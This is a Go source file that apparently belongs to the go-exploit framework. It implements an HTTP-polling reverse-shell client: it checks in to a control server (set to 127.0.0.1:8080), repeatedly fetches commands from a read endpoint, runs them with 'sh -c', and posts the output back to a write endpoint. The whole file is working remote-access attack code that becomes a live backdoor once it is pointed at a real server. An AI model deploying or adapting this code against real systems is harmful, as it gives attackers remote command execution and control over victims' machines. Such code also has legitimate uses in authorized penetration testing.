package main

import (
	"os/exec"
	"time"

	"github.com/vulncheck-oss/go-exploit/protocol"
)

var ReadURL = "http://127.0.0.1:8080/client/read"
var WriteURL = "http://127.0.0.1:8080/client/write"

func main() {
	headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
	_, body, ok := protocol.HTTPSendAndRecvWithHeaders("POST", WriteURL, "d=CHECKIN", headers)
	if !ok || len(body) > 0 {
		return
	}

	for {
		_, body, ok := protocol.HTTPSendAndRecv("GET", ReadURL, "")
		if !ok {
			return
		}
		if len(body) > 0 {
			command := exec.Command("sh", "-c", body)
			out, err := command.Output()
			if err != nil {
				out = []byte(err.Error())
			}
			if string(out) == "exit\n" {
				break
			}
			headers := map[string]string{"Content-Type": "application/x-www-form-urlencoded"}
			_, body, ok := protocol.HTTPSendAndRecvWithHeaders("POST", WriteURL, "d="+string(out), headers)
			if !ok || len(body) > 0 {
				break
			}
			out = []byte{}

		}
		time.Sleep(3 * time.Second)
	}
}
